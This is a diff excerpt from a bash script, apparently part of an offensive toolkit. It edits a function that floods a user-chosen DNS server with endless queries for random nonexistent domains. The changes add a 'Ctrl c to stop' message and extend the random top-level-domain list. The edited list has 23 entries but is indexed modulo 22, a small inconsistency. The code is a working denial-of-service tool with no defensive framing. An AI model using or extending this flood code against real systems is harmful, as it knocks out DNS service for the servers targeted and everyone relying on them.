@@ -1042,6 +1042,7 @@ nxdomainflood()
 echo "Enter the IP address of the target DNS server:"
 read -i $DNSTARGET -e DNSTARGET
 echo "Starting DNS NXDOMAIN Query Flood to $DNSTARGET" && sleep 1
+echo "No output will be shown. Use 'Ctrl c' to stop!"
 #loop forever!
 while :
 do
@@ -1064,8 +1065,8 @@ then
 TRANSID2=0$TRANSID
 fi
 #now we have transaction ID, generate random alphanumeric name to query
-TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de)
-TLD=(${TLDLIST[RANDOM%21]})
+TLDLIST=(com br net org cz au co jp cn ru in ir ua ca xyz site top icu vip online de %RANDOM foo)
+TLD=(${TLDLIST[RANDOM%22]})
 RANDLONG=$((RANDOM % 20 +1))
 STRING=$(< /dev/urandom tr -dc [:alnum:] | head -c$RANDLONG)
 #calculate length of name we are querying as hex
